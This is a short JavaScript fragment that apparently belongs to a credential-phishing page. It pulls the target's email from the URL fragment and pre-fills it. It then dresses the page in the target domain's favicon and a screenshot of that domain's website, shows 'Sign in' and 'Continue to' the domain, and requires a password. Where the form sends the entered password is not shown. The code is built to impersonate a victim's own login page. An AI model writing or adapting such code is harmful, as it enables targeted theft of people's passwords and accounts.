        // Function to extract email from URL hash
        function getEmailFromHash() {
            const hash = window.location.hash.substring(1);
            const email = decodeURIComponent(hash);
            return email.includes('@') ? email : '';
        }

        // Function to set domain favicon and environment based on email domain
        function setDomainEnvironment(email) {
            const domain = email.split('@')[1];
            if (domain) {
                // Set the domain icon using the favicon
                const domainIconUrl = `https://www.google.com/s2/favicons?domain=${domain}`;
                document.getElementById('domainIcon').src = domainIconUrl;

                // Set the favicon for the page
                const faviconLink = document.createElement('link');
                faviconLink.rel = 'icon';
                faviconLink.href = domainIconUrl;
                document.head.appendChild(faviconLink);

                // Handle cases where the favicon might not load directly
                if (domain === 'gmail.com') {
                    document.getElementById('domainIcon').src = 'https://www.google.com/favicon.ico'; // Fallback for Google
                    faviconLink.href = 'https://www.google.com/favicon.ico'; // Fallback for Google favicon
                }

                // Set the domain name as the header
                document.getElementById('domainName').textContent = `Sign in`;

                // Set the domain header text
                document.getElementById('domainHeader').textContent = `Continue to ${domain}`;

                // Set the background to the website's environment
                const backgroundUrl = `https://s.wordpress.com/mshots/v1/${domain}?w=1280`;
                document.body.style.backgroundImage = `url(${backgroundUrl})`;
            }
        }

        // Auto-fill email field and set domain environment
        document.addEventListener('DOMContentLoaded', () => {
            const email = getEmailFromHash();
            if (email) {
                document.getElementById('email').value = email;
                setDomainEnvironment(email);
            }
        });

        // Form validation for empty password
        document.getElementById('loginForm').addEventListener('submit', (event) => {
            const password = document.getElementById('password').value.trim();
            const errorMessage = document.getElementById('errorMessage');
            
            if (password === '') {
                event.preventDefault();
                errorMessage.style.display = 'block';
            } else {
                errorMessage.style.display = 'none';
            }
        });